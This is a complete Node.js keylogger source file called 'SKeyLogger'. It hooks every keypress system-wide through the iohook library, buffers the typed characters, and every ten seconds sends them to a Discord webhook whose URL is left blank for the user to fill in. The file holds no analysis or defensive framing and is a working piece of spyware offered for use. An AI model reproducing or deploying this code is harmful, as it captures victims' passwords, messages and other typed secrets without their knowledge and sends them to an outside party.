"use strict";

// Dependencies
const discord = require("discord.js")
const keycode = require("keycode")
const ioHook = require("iohook")

//Variables
var SKeyLogger = {
    webhookLink: "",
    keys: ""
}

const Webhook = new discord.WebhookClient(SKeyLogger.webhookLink.split("/")[SKeyLogger.webhookLink.split("/").length-2], SKeyLogger.webhookLink.split("/")[SKeyLogger.webhookLink.split("/").length-1])

//Main
ioHook.on("keydown", (event)=>{
    if(keycode.names[event.rawcode] == "enter"){
        SKeyLogger.keys += "\n"
        return
    }else if(keycode.names[event.rawcode] == "space"){
        SKeyLogger.keys += " "
        return
    }else if(!keycode.names[event.rawcode]){
        return
    }

    SKeyLogger.keys += keycode.names[event.rawcode]
})

ioHook.start()

setInterval(function(){
    if(SKeyLogger.keys.length){
        Webhook.send(SKeyLogger.keys).then(()=>{
            SKeyLogger.keys = ""
        })
    }
}, 10000) //Seconds typed keys every 10 seconds
